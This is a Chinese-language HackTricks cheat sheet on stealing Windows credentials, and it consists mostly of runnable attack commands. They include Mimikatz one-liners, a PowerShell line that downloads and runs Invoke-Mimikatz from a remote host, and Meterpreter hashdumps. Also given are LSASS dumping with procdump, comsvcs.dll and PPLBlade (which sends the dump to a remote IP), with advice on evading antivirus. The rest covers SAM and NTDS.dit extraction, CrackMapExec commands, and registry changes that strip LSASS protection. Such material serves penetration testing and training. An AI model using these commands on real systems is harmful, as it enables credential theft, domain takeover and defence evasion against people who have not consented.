# 窃取 Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**在此查找 Mimikatz 可以执行的其他操作** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **这些保护可能会阻止 Mimikatz 提取某些 credentials。**

## 使用 Meterpreter 的 Credentials

使用 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **我创建的** 来 **在受害者内部搜索 passwords 和 hashes**。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## 绕过 AV

### Procdump + Mimikatz

由于 **Procdump 来自** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**是一个合法的 Microsoft 工具**，因此 Defender 不会检测到它。\
你可以使用此工具来 **dump the lsass process**、**download the dump**，并从该 dump 中 **extract** **credentials locally**。

你也可以使用 [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
此过程可使用 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成： `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**：某些 **AV** 可能会将使用 **procdump.exe to dump lsass.exe** 识别为 **malicious**，这是因为它们会 **检测** 到字符串 **"procdump.exe" and "lsass.exe"**。因此，将 lsass.exe 的 **PID** 作为 **参数** 传递给 procdump，而不是使用名称 **lsass.exe**，会更加 **stealthier**。

### 使用 **comsvcs.dll** 转储 lsass

位于 `C:\Windows\System32` 的一个名为 **comsvcs.dll** 的 DLL 负责在崩溃时 **转储进程内存**。该 DLL 包含一个名为 **`MiniDumpW`** 的 **函数**，设计为通过 `rundll32.exe` 调用。\
前两个参数无关紧要，但第三个参数分为三部分。要转储的进程 ID 构成第一部分，转储文件位置为第二部分，第三部分严格为单词 **full**，没有其他选项。\
解析这三部分之后，DLL 会创建转储文件并将指定进程的内存写入该文件。\
可以使用 **comsvcs.dll** 来转储 lsass 进程，从而无需上传并执行 procdump。该方法的详细说明见 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

以下命令用于执行：
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**你可以使用** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **使用 Task Manager 转储 lsass**

1. 右键单击 Task Bar，然后点击 Task Manager
2. 点击 More details
3. 在 Processes 选项卡中搜索 "Local Security Authority Process" 进程
4. 右键单击 "Local Security Authority Process" 进程，然后点击 "Create dump file".

### 使用 procdump 转储 lsass

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是一个由 Microsoft 签名的二进制程序，属于 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## 使用 PPLBlade 转储 lsass

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一个 Protected Process Dumper Tool，支持混淆 memory dump 并在不将其写入磁盘的情况下将其传输到远程工作站。

**主要功能**：

1. 绕过 PPL protection
2. 混淆 memory dump 文件以规避 Defender 的基于签名的检测机制
3. 使用 RAW 和 SMB 上传方法上传 memory dump，而不将其写入磁盘（fileless dump）
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon 提供了一个三阶段的 dumper，名为 **LalsDumper**，它从不调用 `MiniDumpWriteDump`，因此针对该 API 的 EDR 钩子不会触发：

1. **Stage 1 loader (`lals.exe`)** – 搜索 `fdp.dll` 中由 32 个小写字母 `d` 组成的占位符，用 `rtu.txt` 的绝对路径覆盖它，将补丁后的 DLL 保存为 `nfdp.dll`，并调用 `AddSecurityPackageA("nfdp","fdp")`。这会强制 **LSASS** 将该恶意 DLL 作为新的 Security Support Provider (SSP) 加载。
2. **Stage 2 inside LSASS** – 当 **LSASS** 加载 `nfdp.dll` 时，DLL 读取 `rtu.txt`，将每个字节与 `0x20` 进行 XOR 运算，并将解码后的 blob 映射到内存中，然后转移执行。
3. **Stage 3 dumper** – 映射的 payload 使用从哈希 API 名称解析出的 direct syscalls 重新实现 MiniDump 逻辑（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）。一个名为 `Tom` 的导出会打开 `%TEMP%\<pid>.ddt`，将压缩的 LSASS dump 流式写入该文件，然后关闭句柄，以便随后进行 exfiltration。

Operator notes:

* 将 `lals.exe`、`fdp.dll`、`nfdp.dll` 和 `rtu.txt` 保持在同一目录。Stage 1 会将硬编码的占位符重写为 `rtu.txt` 的绝对路径，因此将它们拆分会破坏链条。
* 注册是通过将 `nfdp` 追加到 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` 来完成的。你可以自行设置该值，使 **LSASS** 在每次启动时重新加载 SSP。
* `%TEMP%\*.ddt` 文件是压缩的 dumps。先在本地解压，然后交给 Mimikatz/Volatility 提取凭据。
* 运行 `lals.exe` 需要 admin/SeTcb 权限以使 `AddSecurityPackageA` 成功；调用返回后，**LSASS** 会透明地加载恶意 SSP 并执行 Stage 2。
* 从磁盘移除 DLL 并不会将其从 **LSASS** 中驱逐。要么删除注册表项并重启 **LSASS**（重启系统），要么保留它以实现长期持久化。

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 从目标 DC 转储 NTDS.dit
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 从目标 DC 转储 NTDS.dit 的密码历史
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 显示每个 NTDS.dit 帐户的 pwdLastSet 属性
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

这些文件应**位于** _C:\windows\system32\config\SAM_ 和 _C:\windows\system32\config\SYSTEM_. 但**你不能以常规方式直接复制它们**，因为它们受到保护。

### 从注册表

窃取这些文件最简单的方法是从注册表获取它们的副本：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**下载** 这些文件到你的 Kali 机器上，并使用以下命令 **提取 hashes**：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

您可以使用此服务复制受保护的文件。您需要是 Administrator。

#### Using vssadmin

vssadmin 二进制仅在 Windows Server 版本中可用
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
但是你也可以用 **Powershell** 做同样的事。下面是一个 **如何复制 SAM 文件** 的示例（所使用的硬盘为 "C:"，并将其保存到 C:\users\Public），但你可以用它来复制任何受保护的文件：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
来自书中的代码：[https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

最后，你也可以使用 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 来复制 SAM、SYSTEM 和 ntds.dit。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 凭据 - NTDS.dit**

**NTDS.dit** 文件被视为 **Active Directory** 的核心，保存有关用户对象、组及其成员关系的重要数据。域用户的 **password hashes** 存储在此文件中。该文件是一个 **Extensible Storage Engine (ESE)** 数据库，位于 **_%SystemRoom%/NTDS/ntds.dit_**。

在该数据库中，维护着三个主要表：

- **Data Table**：负责存储诸如用户和组等对象的详细信息。
- **Link Table**：跟踪关系，例如组成员资格。
- **SD Table**：此处保存每个对象的 **Security descriptors**，以确保存储对象的安全性和访问控制。

更多信息： [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows 使用 _Ntdsa.dll_ 与该文件交互，并由 _lsass.exe_ 使用。因此，**NTDS.dit** 文件的部分内容可能位于 `lsass` 的内存中（由于使用 **缓存** 提高性能，通常可以在内存中找到最近访问的数据）。

#### 解密 NTDS.dit 中的 hashes

hash 被加密了 3 次：

1. 使用 **BOOTKEY** 和 **RC4** 解密 Password Encryption Key（**PEK**）。
2. 使用 **PEK** 和 **RC4** 解密该 **hash**。
3. 使用 **DES** 解密该 **hash**。

**PEK** 在 **每个域控制器** 中具有 **相同的值**，但它在 **NTDS.dit** 文件内被使用域控制器的 **SYSTEM** 文件的 **BOOTKEY** 加密（不同域控制器之间该 BOOTKEY 不同）。这就是为什么要从 NTDS.dit 文件获取凭据时，**你需要 NTDS.dit 和 SYSTEM 文件**（_C:\Windows\System32\config\SYSTEM_）。

### 使用 Ntdsutil 复制 NTDS.dit

自 Windows Server 2008 起可用。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
你也可以使用 [**volume shadow copy**](#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住，你还需要一份 **SYSTEM file** 的副本（再次使用 [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) 技巧）。

### **从 NTDS.dit 提取哈希值**

一旦你**获得**了 **NTDS.dit** 和 **SYSTEM** 文件，就可以使用像 _secretsdump.py_ 这样的工具来**提取哈希值**：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
你也可以使用有效的域管理员用户**自动提取它们**：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
For **大型 NTDS.dit 文件**，建议使用 [gosecretsdump](https://github.com/c-sto/gosecretsdump) 提取它。

Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ or **mimikatz** `lsadump::lsa /inject`

### **将域对象从 NTDS.dit 导出到 SQLite 数据库**

可以使用 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) 将 NTDS 对象提取到 SQLite 数据库。不仅会提取 secrets，还会提取整个对象及其属性，便于在已获取原始 NTDS.dit 文件时进一步提取信息。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive 是可选的，但允许对 secrets 进行解密（NT & LM hashes、补充凭证例如明文密码、kerberos 或 trust keys、NT & LM 密码历史）。除其他信息外，还会提取以下数据：用户和计算机账户及其 hashes、UAC flags、最后登录和密码更改的时间戳、账户描述、名称、UPN、SPN、组及递归成员关系、组织单位树及其成员、受信任域以及信任的类型、方向和属性...

## Lazagne

从 [here](https://github.com/AlessandroZ/LaZagne/releases) 下载二进制文件。你可以使用此二进制文件从多个软件中提取凭证。
```
lazagne.exe all
```
## 用于从 SAM 和 LSASS 提取 credentials 的其他工具

### Windows credentials Editor (WCE)

该工具可用于从内存中提取 credentials。下载自: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

从 SAM 文件中提取 credentials
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

从 SAM 文件中提取凭证
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

从以下地址下载：[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) 然后只需**执行它**，密码就会被提取。

## 挖掘空闲 RDP 会话并削弱安全控制

Ink Dragon’s FinalDraft RAT 包含一个 `DumpRDPHistory` tasker，其技术对任何 red-teamer 都很有用：

### DumpRDPHistory-style telemetry collection

* **出站 RDP 目标** – 在 `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` 解析每个用户 hive。每个子项存储服务器名、`UsernameHint` 和最后写入时间戳。你可以用 PowerShell 复现 FinalDraft 的逻辑：

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **入站 RDP 证据** – 查询 `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 日志中事件 ID **21**（成功登录）和 **25**（断开）以映射谁管理了该主机：

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

一旦你知道哪个 Domain Admin 经常连接，当他们的 **断开** 会话仍然存在时，使用 LalsDumper/Mimikatz 转储 LSASS。CredSSP + NTLM 回退会将他们的 verifier 和令牌留在 LSASS 中，这些可以通过 SMB/WinRM 重放，以获取 `NTDS.dit` 或在域控制器上部署持久化。

### Registry downgrades targeted by FinalDraft

同一植入程序还篡改了若干注册表键，以便更容易窃取凭证：
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* 设置 `DisableRestrictedAdmin=1` 强制在 RDP 会话中完全重用凭证/票据，从而启用 pass-the-hash style pivots。
* `LocalAccountTokenFilterPolicy=1` 禁用 UAC 令牌过滤，使本地管理员在网络上获得不受限制的令牌。
* `DSRMAdminLogonBehavior=2` 允许 DSRM 管理员在 DC 在线时登录，为攻击者提供另一个内置的高权限账户。
* `RunAsPPL=0` 移除 LSASS PPL 保护，使像 LalsDumper 这样的转储工具可以轻松访问内存。

## 参考

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
